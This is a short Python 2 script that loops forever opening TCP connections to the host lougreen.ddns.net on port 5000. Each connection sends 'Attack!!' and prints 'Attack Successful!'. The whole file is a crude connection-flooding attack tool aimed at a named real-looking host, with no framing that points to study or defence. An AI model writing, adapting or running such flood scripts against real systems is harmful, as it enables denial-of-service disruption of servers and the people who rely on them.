#!/usr/bin/env python
#####################
import socket, sys, os  

a=0

while True:  
    try: 
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
	s.connect(("lougreen.ddns.net", 5000))
	s.send("Attack!!")  
	print "Attack Successful!"
	s.close()
    except socket.error:
	a=a+1
